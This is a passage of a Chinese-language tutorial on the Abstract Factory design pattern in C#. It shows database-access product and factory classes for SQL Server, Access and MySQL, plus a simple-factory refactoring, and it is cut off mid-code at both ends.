punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体工厂的抽象父工厂的对象</span>            IFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AccessFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体类的抽象父类对象</span>            IUser iu <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 具体商品对象的操作</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 抽象父工厂重新赋值</span>            factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlServerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IDepartment id <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/经典抽象工厂测试.png" alt="经典抽象工厂测试"></center><p><strong>业务扩展</strong>：</p><p>将程序使用数据库全部换成Mysql数据库。</p><p><strong>具体产品</strong>：</p><p>添加MysqlUser类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">MysqlUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>添加MysqlDepartment类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">MysqlDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Mysql中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>具体工厂</strong>：</p><p>添加MysqlFactory类：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">MysqlFactory</span> <span class="token punctuation">:</span> IFactory    <span class="token punctuation">{</span>        <span class="token keyword">public</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MysqlUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">MysqlDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>修改测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> AbstractFactory<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/// &lt;summary></span>    <span class="token comment" spellcheck="true">/// 测试类</span>    <span class="token comment" spellcheck="true">/// &lt;/summary></span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// User实体</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// Department实体</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体工厂的抽象父工厂的对象</span>            <span class="token comment" spellcheck="true">//IFactory factory = new AccessFactory();</span>            IFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MysqlFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 实例化一个具体类的抽象父类对象</span>            IUser iu <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 具体商品对象的操作</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">ReadKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/抽象工厂-业务扩展测试.png" alt="抽象工厂-业务扩展测试"></center><p><strong>注</strong>：</p><ul><li>进行业务扩展时，需要添加新的具体产品和具体工厂</li><li>具体产品和具体工厂必须实现抽象产品和抽象工厂</li></ul><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p>优点：</p><ul><li>客户端与具体类解耦；</li><li>添加具体类更加方便</li></ul><p>缺点：</p><ul><li>增加代码量和负责程度</li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>​        通过定义可以了解到，抽象工厂模式就为解决具有相同（或者相似）等级结构的多个产品族中的产品对象的创建问题。所以抽象工厂模式一般用于具有产品树和产品族的场景下。</p><h1 id="进一步改进"><a href="#进一步改进" class="headerlink" title="进一步改进"></a>进一步改进</h1><p>​        虽然抽象工厂模式将<strong>开放-封闭原则</strong>，<strong>依赖倒置原则</strong>发挥到极致，使得在<strong>切换接口</strong>的情况下非常方便，但是当系统中需要<strong>增加功能</strong>时，因功能分散导致需要添加多个新类才能实现。</p><p>比如：在上面的代码实例中添加项目表<strong>Project</strong>，至少要增加<strong>IProject、SqlServerProject、AccessProject</strong>，还需要更改<strong>IFactory、SqlServerFactory、AccessFactory</strong>才能完全实现。</p><h2 id="用简单工厂来改进抽象工厂"><a href="#用简单工厂来改进抽象工厂" class="headerlink" title="用简单工厂来改进抽象工厂"></a>用简单工厂来改进抽象工厂</h2><p>​        去除IFactory、SqlServerFactory和AccessFactory三个工厂类，取而代之的是DataAccess类，用一个简单工厂模式来实现。</p><p><strong>代码结构图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/用简单工厂来改进抽象工厂程序.jpg" alt="用简单工厂来改进抽象工厂程序"></center><p><strong>实体类</strong>：</p><p><strong>User类</strong>:</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>Department类</strong>:</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>抽象产品</strong>：</p><p><strong>IUser类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>IDepartment类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>具体产品</strong>：</p><p><strong>SqlserverUser类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>AccessUser类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>SqlserverDepartment类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>AccessDepartment类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">AccessDepartment</span> <span class="token punctuation">:</span> IDepartment    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给Department表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到Department表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>工厂类</strong>：</p><p><strong>DataAccess类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">DataAccess</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">readonly</span> <span class="token keyword">string</span> db <span class="token operator">=</span> <span class="token string">"Sqlserver"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//private static readonly string db = "Access";</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IUser <span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            IUser result <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>db<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"Sqlserver"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"Access"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AccessUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> IDepartment <span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            IDepartment result <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>db<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"Sqlserver"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlserverDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"Access"</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AccessDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Department dept <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Department</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IUser iu <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            iu<span class="token punctuation">.</span><span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            IDepartment id <span class="token operator">=</span> DataAccess<span class="token punctuation">.</span><span class="token function">CreateDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>dept<span class="token punctuation">)</span><span class="token punctuation">;</span>            id<span class="token punctuation">.</span><span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/抽象工厂模式/用简单工厂来改进抽象工厂测试结果.png" alt="用简单工厂来改进抽象工厂测试结果"></center><p><strong>注</strong>：</p><ul><li>客户端完全不知道后端使用的数据库接口</li><li>但当增加数据库接口时，就需要在DataAccess类中修改每个方法</li></ul><h2 id="绝佳改进方案"><a href="#绝佳改进方案" class="headerlink" title="绝佳改进方案"></a>绝佳改进方案</h2><p>​        使用简单工厂改进的抽象工厂中，引入switch导致程序耦合，添加后修改程序时需要修改一连串的类，通过某种方式避免这种耦合就可以达到绝佳的改进效果。下面引入：<strong>反射 + 配置文件 + 抽象工厂</strong></p><p><strong>实体类</strong>：（User 、 Department）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 测试基类</span>    <span class="token keyword">class</span> <span class="token class-name">User</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Department</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> _id<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">int</span> ID        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _id<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _id <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> _deptName<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> DeptName        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> _deptName<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> _deptName <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>抽象产品</strong>：（IUser、IDepartment）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> User类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span><span class="token punctuation">;</span>        User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Department类的数据操作接口</span>    <span class="token keyword">interface</span> <span class="token class-name">IDepartment</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>Department department<span class="token punctuation">)</span><span class="token punctuation">;</span>        Department <span class="token function">GetDepartment</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>具体产品</strong>：（SqlserverUser、AccessUser、SqlserverDepartment、AccessDepartment）</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverUser类在SQL Server中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Sqlserver中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> AccessUser类在Access中对User执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">AccessUser</span> <span class="token punctuation">:</span> IUser    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Insert</span><span class="token punctuation">(</span>User user<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中给User表增加一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> User <span class="token function">GetUser</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"在Access中根据ID得到User表一条记录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> SqlserverDepartment类在SQL Server中对Department执行相关操作</span>    <span class="token keyword">class</span> <span class="token class-name">SqlserverDepartment</span> <span class="token 